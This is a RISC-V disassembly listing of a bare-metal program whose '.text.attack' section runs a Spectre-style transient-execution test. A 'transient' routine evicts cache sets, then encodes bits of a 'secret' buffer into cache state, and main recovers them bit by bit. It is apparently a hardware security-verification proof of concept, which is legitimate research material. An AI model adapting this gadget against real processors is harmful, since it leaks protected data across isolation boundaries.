    800089d0:	fe042623          	sw	zero,-20(s0)
    800089d4:	0dc0006f          	j	80008ab0 <verifyDouble+0xfc>
    800089d8:	fec42783          	lw	a5,-20(s0)
    800089dc:	00379793          	sll	a5,a5,0x3
    800089e0:	fb043703          	ld	a4,-80(s0)
    800089e4:	00f707b3          	add	a5,a4,a5
    800089e8:	0007b787          	fld	fa5,0(a5)
    800089ec:	fef43027          	fsd	fa5,-32(s0)
    800089f0:	fec42783          	lw	a5,-20(s0)
    800089f4:	00178793          	add	a5,a5,1
    800089f8:	00379793          	sll	a5,a5,0x3
    800089fc:	fb043703          	ld	a4,-80(s0)
    80008a00:	00f707b3          	add	a5,a4,a5
    80008a04:	0007b787          	fld	fa5,0(a5)
    80008a08:	fcf43c27          	fsd	fa5,-40(s0)
    80008a0c:	fec42783          	lw	a5,-20(s0)
    80008a10:	00379793          	sll	a5,a5,0x3
    80008a14:	fa843703          	ld	a4,-88(s0)
    80008a18:	00f707b3          	add	a5,a4,a5
    80008a1c:	0007b787          	fld	fa5,0(a5)
    80008a20:	fcf43827          	fsd	fa5,-48(s0)
    80008a24:	fec42783          	lw	a5,-20(s0)
    80008a28:	00178793          	add	a5,a5,1
    80008a2c:	00379793          	sll	a5,a5,0x3
    80008a30:	fa843703          	ld	a4,-88(s0)
    80008a34:	00f707b3          	add	a5,a4,a5
    80008a38:	0007b787          	fld	fa5,0(a5)
    80008a3c:	fcf43427          	fsd	fa5,-56(s0)
    80008a40:	fe043707          	fld	fa4,-32(s0)
    80008a44:	fd043787          	fld	fa5,-48(s0)
    80008a48:	a2f727d3          	feq.d	a5,fa4,fa5
    80008a4c:	00f037b3          	snez	a5,a5
    80008a50:	0ff7f793          	zext.b	a5,a5
    80008a54:	fcf42223          	sw	a5,-60(s0)
    80008a58:	fd843707          	fld	fa4,-40(s0)
    80008a5c:	fc843787          	fld	fa5,-56(s0)
    80008a60:	a2f727d3          	feq.d	a5,fa4,fa5
    80008a64:	00f037b3          	snez	a5,a5
    80008a68:	0ff7f793          	zext.b	a5,a5
    80008a6c:	fcf42023          	sw	a5,-64(s0)
    80008a70:	fc442783          	lw	a5,-60(s0)
    80008a74:	00078713          	mv	a4,a5
    80008a78:	fc042783          	lw	a5,-64(s0)
    80008a7c:	00f777b3          	and	a5,a4,a5
    80008a80:	0007879b          	sext.w	a5,a5
    80008a84:	02079063          	bnez	a5,80008aa4 <verifyDouble+0xf0>
    80008a88:	fec42783          	lw	a5,-20(s0)
    80008a8c:	0017879b          	addw	a5,a5,1
    80008a90:	0007879b          	sext.w	a5,a5
    80008a94:	fc442703          	lw	a4,-60(s0)
    80008a98:	00f707bb          	addw	a5,a4,a5
    80008a9c:	0007879b          	sext.w	a5,a5
    80008aa0:	08c0006f          	j	80008b2c <verifyDouble+0x178>
    80008aa4:	fec42783          	lw	a5,-20(s0)
    80008aa8:	0027879b          	addw	a5,a5,2
    80008aac:	fef42623          	sw	a5,-20(s0)
    80008ab0:	fbc42783          	lw	a5,-68(s0)
    80008ab4:	01f7d71b          	srlw	a4,a5,0x1f
    80008ab8:	00f707bb          	addw	a5,a4,a5
    80008abc:	4017d79b          	sraw	a5,a5,0x1
    80008ac0:	0007879b          	sext.w	a5,a5
    80008ac4:	0017979b          	sllw	a5,a5,0x1
    80008ac8:	0007871b          	sext.w	a4,a5
    80008acc:	fec42783          	lw	a5,-20(s0)
    80008ad0:	0007879b          	sext.w	a5,a5
    80008ad4:	f0e7c2e3          	blt	a5,a4,800089d8 <verifyDouble+0x24>
    80008ad8:	fbc42783          	lw	a5,-68(s0)
    80008adc:	0017f793          	and	a5,a5,1
    80008ae0:	0007879b          	sext.w	a5,a5
    80008ae4:	04078263          	beqz	a5,80008b28 <verifyDouble+0x174>
    80008ae8:	fbc42783          	lw	a5,-68(s0)
    80008aec:	00379793          	sll	a5,a5,0x3
    80008af0:	ff878793          	add	a5,a5,-8
    80008af4:	fb043703          	ld	a4,-80(s0)
    80008af8:	00f707b3          	add	a5,a4,a5
    80008afc:	0007b707          	fld	fa4,0(a5)
    80008b00:	fbc42783          	lw	a5,-68(s0)
    80008b04:	00379793          	sll	a5,a5,0x3
    80008b08:	ff878793          	add	a5,a5,-8
    80008b0c:	fa843703          	ld	a4,-88(s0)
    80008b10:	00f707b3          	add	a5,a4,a5
    80008b14:	0007b787          	fld	fa5,0(a5)
    80008b18:	a2f727d3          	feq.d	a5,fa4,fa5
    80008b1c:	00079663          	bnez	a5,80008b28 <verifyDouble+0x174>
    80008b20:	fbc42783          	lw	a5,-68(s0)
    80008b24:	0080006f          	j	80008b2c <verifyDouble+0x178>
    80008b28:	00000793          	li	a5,0
    80008b2c:	00078513          	mv	a0,a5
    80008b30:	05813403          	ld	s0,88(sp)
    80008b34:	06010113          	add	sp,sp,96
    80008b38:	00008067          	ret

0000000080008b3c <barrier>:
    80008b3c:	fe010113          	add	sp,sp,-32
    80008b40:	00813c23          	sd	s0,24(sp)
    80008b44:	02010413          	add	s0,sp,32
    80008b48:	00050793          	mv	a5,a0
    80008b4c:	fef42623          	sw	a5,-20(s0)
    80008b50:	0ff0000f          	fence
    80008b54:	08422783          	lw	a5,132(tp) # 84 <threadsense.2>
    80008b58:	0017b793          	seqz	a5,a5
    80008b5c:	0ff7f793          	zext.b	a5,a5
    80008b60:	0007871b          	sext.w	a4,a5
    80008b64:	08e22223          	sw	a4,132(tp) # 84 <threadsense.2>
    80008b68:	ffffd797          	auipc	a5,0xffffd
    80008b6c:	49878793          	add	a5,a5,1176 # 80006000 <count.1>
    80008b70:	00100713          	li	a4,1
    80008b74:	0f50000f          	fence	iorw,ow
    80008b78:	04e7a6af          	amoadd.w.aq	a3,a4,(a5)
    80008b7c:	0006879b          	sext.w	a5,a3
    80008b80:	0007871b          	sext.w	a4,a5
    80008b84:	fec42783          	lw	a5,-20(s0)
    80008b88:	fff7879b          	addw	a5,a5,-1
    80008b8c:	0007879b          	sext.w	a5,a5
    80008b90:	02f71263          	bne	a4,a5,80008bb4 <barrier+0x78>
    80008b94:	ffffd797          	auipc	a5,0xffffd
    80008b98:	46c78793          	add	a5,a5,1132 # 80006000 <count.1>
    80008b9c:	0007a023          	sw	zero,0(a5)
    80008ba0:	08422703          	lw	a4,132(tp) # 84 <threadsense.2>
    80008ba4:	ffffd797          	auipc	a5,0xffffd
    80008ba8:	46078793          	add	a5,a5,1120 # 80006004 <sense.0>
    80008bac:	00e7a023          	sw	a4,0(a5)
    80008bb0:	0200006f          	j	80008bd0 <barrier+0x94>
    80008bb4:	00000013          	nop
    80008bb8:	ffffd797          	auipc	a5,0xffffd
    80008bbc:	44c78793          	add	a5,a5,1100 # 80006004 <sense.0>
    80008bc0:	0007a783          	lw	a5,0(a5)
    80008bc4:	0007871b          	sext.w	a4,a5
    80008bc8:	08422783          	lw	a5,132(tp) # 84 <threadsense.2>
    80008bcc:	fef716e3          	bne	a4,a5,80008bb8 <barrier+0x7c>
    80008bd0:	0ff0000f          	fence
    80008bd4:	00000013          	nop
    80008bd8:	01813403          	ld	s0,24(sp)
    80008bdc:	02010113          	add	sp,sp,32
    80008be0:	00008067          	ret

0000000080008be4 <lfsr>:
    80008be4:	fd010113          	add	sp,sp,-48
    80008be8:	02813423          	sd	s0,40(sp)
    80008bec:	03010413          	add	s0,sp,48
    80008bf0:	fca43c23          	sd	a0,-40(s0)
    80008bf4:	fd843783          	ld	a5,-40(s0)
    80008bf8:	0017d713          	srl	a4,a5,0x1
    80008bfc:	fd843783          	ld	a5,-40(s0)
    80008c00:	00f747b3          	xor	a5,a4,a5
    80008c04:	0017f793          	and	a5,a5,1
    80008c08:	fef43423          	sd	a5,-24(s0)
    80008c0c:	fd843783          	ld	a5,-40(s0)
    80008c10:	0017d713          	srl	a4,a5,0x1
    80008c14:	fe843783          	ld	a5,-24(s0)
    80008c18:	03e79793          	sll	a5,a5,0x3e
    80008c1c:	00f767b3          	or	a5,a4,a5
    80008c20:	00078513          	mv	a0,a5
    80008c24:	02813403          	ld	s0,40(sp)
    80008c28:	03010113          	add	sp,sp,48
    80008c2c:	00008067          	ret

0000000080008c30 <lfsr10>:
    80008c30:	fd010113          	add	sp,sp,-48
    80008c34:	02813423          	sd	s0,40(sp)
    80008c38:	03010413          	add	s0,sp,48
    80008c3c:	fca43c23          	sd	a0,-40(s0)
    80008c40:	fd843783          	ld	a5,-40(s0)
    80008c44:	00a7d713          	srl	a4,a5,0xa
    80008c48:	fd843783          	ld	a5,-40(s0)
    80008c4c:	00f747b3          	xor	a5,a4,a5
    80008c50:	3ff7f793          	and	a5,a5,1023
    80008c54:	fef43423          	sd	a5,-24(s0)
    80008c58:	fd843783          	ld	a5,-40(s0)
    80008c5c:	00a7d713          	srl	a4,a5,0xa
    80008c60:	fe843783          	ld	a5,-24(s0)
    80008c64:	03579793          	sll	a5,a5,0x35
    80008c68:	00f767b3          	or	a5,a4,a5
    80008c6c:	00078513          	mv	a0,a5
    80008c70:	02813403          	ld	s0,40(sp)
    80008c74:	03010113          	add	sp,sp,48
    80008c78:	00008067          	ret

0000000080008c7c <transient>:
    80008c7c:	fe010113          	add	sp,sp,-32
    80008c80:	00813c23          	sd	s0,24(sp)
    80008c84:	02010413          	add	s0,sp,32
    80008c88:	fea43423          	sd	a0,-24(s0)
    80008c8c:	12000073          	sfence.vma
    80008c90:	005f7597          	auipc	a1,0x5f7
    80008c94:	3b058593          	add	a1,a1,944 # 80600040 <conflict+0x40>
    80008c98:	0005b603          	ld	a2,0(a1)
    80008c9c:	005f8597          	auipc	a1,0x5f8
    80008ca0:	3a458593          	add	a1,a1,932 # 80601040 <conflict1+0x40>
    80008ca4:	0005b603          	ld	a2,0(a1)
    80008ca8:	005f9597          	auipc	a1,0x5f9
    80008cac:	39858593          	add	a1,a1,920 # 80602040 <conflict2+0x40>
    80008cb0:	0005b603          	ld	a2,0(a1)
    80008cb4:	005fa597          	auipc	a1,0x5fa
    80008cb8:	38c58593          	add	a1,a1,908 # 80603040 <conflict3+0x40>
    80008cbc:	0005b603          	ld	a2,0(a1)
    80008cc0:	005fb597          	auipc	a1,0x5fb
    80008cc4:	38058593          	add	a1,a1,896 # 80604040 <conflict4+0x40>
    80008cc8:	0005b603          	ld	a2,0(a1)
    80008ccc:	005fc597          	auipc	a1,0x5fc
    80008cd0:	37458593          	add	a1,a1,884 # 80605040 <conflict5+0x40>
    80008cd4:	0005b603          	ld	a2,0(a1)
    80008cd8:	005fd597          	auipc	a1,0x5fd
    80008cdc:	36858593          	add	a1,a1,872 # 80606040 <conflict6+0x40>
    80008ce0:	0005b603          	ld	a2,0(a1)
    80008ce4:	005fe597          	auipc	a1,0x5fe
    80008ce8:	35c58593          	add	a1,a1,860 # 80607040 <conflict7+0x40>
    80008cec:	0005b603          	ld	a2,0(a1)
    80008cf0:	0ff0000f          	fence
    80008cf4:	00000197          	auipc	gp,0x0
    80008cf8:	05c18193          	add	gp,gp,92 # 80008d50 <transient+0xd4>
    80008cfc:	003f7797          	auipc	a5,0x3f7
    80008d00:	30478793          	add	a5,a5,772 # 80400000 <data>
    80008d04:	003f9597          	auipc	a1,0x3f9
    80008d08:	2fc58593          	add	a1,a1,764 # 80402000 <data2>
    80008d0c:	007f7717          	auipc	a4,0x7f7
    80008d10:	2f470713          	add	a4,a4,756 # 80800000 <secret>
    80008d14:	10000613          	li	a2,256
    80008d18:	00200693          	li	a3,2
    80008d1c:	d036f753          	fcvt.s.lu	fa4,a3
    80008d20:	d03677d3          	fcvt.s.lu	fa5,a2
    80008d24:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80008d28:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80008d2c:	c037f653          	fcvt.lu.s	a2,fa5
    80008d30:	00c585b3          	add	a1,a1,a2
    80008d34:	0005b603          	ld	a2,0(a1)
    80008d38:	00073683          	ld	a3,0(a4)
    80008d3c:	00a6d6b3          	srl	a3,a3,a0
    80008d40:	0016f693          	and	a3,a3,1
    80008d44:	00c69693          	sll	a3,a3,0xc
    80008d48:	00d787b3          	add	a5,a5,a3
    80008d4c:	0007b783          	ld	a5,0(a5)
    80008d50:	00000193          	li	gp,0
    80008d54:	00000013          	nop
    80008d58:	01813403          	ld	s0,24(sp)
    80008d5c:	02010113          	add	sp,sp,32
    80008d60:	00008067          	ret

0000000080008d64 <main>:
    80008d64:	f7010113          	add	sp,sp,-144
    80008d68:	08113423          	sd	ra,136(sp)
    80008d6c:	08813023          	sd	s0,128(sp)
    80008d70:	09010413          	add	s0,sp,144
    80008d74:	37ab77b7          	lui	a5,0x37ab7
    80008d78:	00279793          	sll	a5,a5,0x2
    80008d7c:	eef78793          	add	a5,a5,-273 # 37ab6eef <threadsense.2+0x37ab6e6b>
    80008d80:	fcf43c23          	sd	a5,-40(s0)
    80008d84:	f8043c23          	sd	zero,-104(s0)
    80008d88:	fa043023          	sd	zero,-96(s0)
    80008d8c:	fa043423          	sd	zero,-88(s0)
    80008d90:	fa043823          	sd	zero,-80(s0)
    80008d94:	f6043c23          	sd	zero,-136(s0)
    80008d98:	f8043023          	sd	zero,-128(s0)
    80008d9c:	f8043423          	sd	zero,-120(s0)
    80008da0:	f8043823          	sd	zero,-112(s0)
    80008da4:	01f00793          	li	a5,31
    80008da8:	fef42623          	sw	a5,-20(s0)
    80008dac:	0fc0006f          	j	80008ea8 <main+0x144>
    80008db0:	f6043823          	sd	zero,-144(s0)
    80008db4:	fe042423          	sw	zero,-24(s0)
    80008db8:	02c0006f          	j	80008de4 <main+0x80>
    80008dbc:	fec42783          	lw	a5,-20(s0)
    80008dc0:	00078513          	mv	a0,a5
    80008dc4:	eb9ff0ef          	jal	80008c7c <transient>
    80008dc8:	003f7797          	auipc	a5,0x3f7
    80008dcc:	23878793          	add	a5,a5,568 # 80400000 <data>
    80008dd0:	0407c783          	lbu	a5,64(a5)
    80008dd4:	faf43c23          	sd	a5,-72(s0)
    80008dd8:	fe842783          	lw	a5,-24(s0)
    80008ddc:	0017879b          	addw	a5,a5,1
    80008de0:	fef42423          	sw	a5,-24(s0)
    80008de4:	fe842783          	lw	a5,-24(s0)
    80008de8:	0007879b          	sext.w	a5,a5
    80008dec:	fcf058e3          	blez	a5,80008dbc <main+0x58>
    80008df0:	fe042223          	sw	zero,-28(s0)
    80008df4:	fe042023          	sw	zero,-32(s0)
    80008df8:	0380006f          	j	80008e30 <main+0xcc>
    80008dfc:	fe042783          	lw	a5,-32(s0)
    80008e00:	00379793          	sll	a5,a5,0x3
    80008e04:	ff078793          	add	a5,a5,-16
    80008e08:	008787b3          	add	a5,a5,s0
    80008e0c:	f807b703          	ld	a4,-128(a5)
    80008e10:	04100793          	li	a5,65
    80008e14:	00e7f863          	bgeu	a5,a4,80008e24 <main+0xc0>
    80008e18:	fe442783          	lw	a5,-28(s0)
    80008e1c:	0017879b          	addw	a5,a5,1
    80008e20:	fef42223          	sw	a5,-28(s0)
    80008e24:	fe042783          	lw	a5,-32(s0)
    80008e28:	0017879b          	addw	a5,a5,1
    80008e2c:	fef42023          	sw	a5,-32(s0)
    80008e30:	fe042783          	lw	a5,-32(s0)
    80008e34:	0007879b          	sext.w	a5,a5
    80008e38:	fcf052e3          	blez	a5,80008dfc <main+0x98>
    80008e3c:	fe442783          	lw	a5,-28(s0)
    80008e40:	0007879b          	sext.w	a5,a5
    80008e44:	00f027b3          	sgtz	a5,a5
    80008e48:	0ff7f793          	zext.b	a5,a5
    80008e4c:	00078713          	mv	a4,a5
    80008e50:	fec42783          	lw	a5,-20(s0)
    80008e54:	ff078793          	add	a5,a5,-16
    80008e58:	008787b3          	add	a5,a5,s0
    80008e5c:	fae78423          	sb	a4,-88(a5)
    80008e60:	fe442783          	lw	a5,-28(s0)
    80008e64:	0007879b          	sext.w	a5,a5
    80008e68:	00f04e63          	bgtz	a5,80008e84 <main+0x120>
    80008e6c:	fe442783          	lw	a5,-28(s0)
    80008e70:	0ff7f793          	zext.b	a5,a5
    80008e74:	00100713          	li	a4,1
    80008e78:	40f707bb          	subw	a5,a4,a5
    80008e7c:	0ff7f793          	zext.b	a5,a5
    80008e80:	00c0006f          	j	80008e8c <main+0x128>
    80008e84:	fe442783          	lw	a5,-28(s0)
    80008e88:	0ff7f793          	zext.b	a5,a5
    80008e8c:	fec42703          	lw	a4,-20(s0)
    80008e90:	ff070713          	add	a4,a4,-16
    80008e94:	00870733          	add	a4,a4,s0
    80008e98:	f8f70423          	sb	a5,-120(a4)
    80008e9c:	fec42783          	lw	a5,-20(s0)
    80008ea0:	fff7879b          	addw	a5,a5,-1
    80008ea4:	fef42623          	sw	a5,-20(s0)
    80008ea8:	fec42783          	lw	a5,-20(s0)
    80008eac:	0007879b          	sext.w	a5,a5
    80008eb0:	f007d0e3          	bgez	a5,80008db0 <main+0x4c>
    80008eb4:	600007b7          	lui	a5,0x60000
    80008eb8:	fcf43823          	sd	a5,-48(s0)
    80008ebc:	600007b7          	lui	a5,0x60000
    80008ec0:	01078793          	add	a5,a5,16 # 60000010 <threadsense.2+0x5fffff8c>
    80008ec4:	fcf43423          	sd	a5,-56(s0)
    80008ec8:	fc0403a3          	sb	zero,-57(s0)
    80008ecc:	fc843783          	ld	a5,-56(s0)
    80008ed0:	fc744703          	lbu	a4,-57(s0)
    80008ed4:	00e78023          	sb	a4,0(a5)
    80008ed8:	0ff0000f          	fence
    80008edc:	fd043783          	ld	a5,-48(s0)
    80008ee0:	00078023          	sb	zero,0(a5)
    80008ee4:	00000793          	li	a5,0
    80008ee8:	00078513          	mv	a0,a5
    80008eec:	08813083          	ld	ra,136(sp)
    80008ef0:	08013403          	ld	s0,128(sp)
    80008ef4:	09010113          	add	sp,sp,144
    80008ef8:	00008067          	ret

Disassembly of section .text.attack:

0000000080200000 <attack>:
    80200000:	ffe09097          	auipc	ra,0xffe09
    80200004:	d64080e7          	jalr	-668(ra) # 80008d64 <main>

0000000080200008 <attack_end>:
    80200008:	ffe00297          	auipc	t0,0xffe00
    8020000c:	01428293          	add	t0,t0,20 # 8000001c <stvec_handler>
    80200010:	00028067          	jr	t0
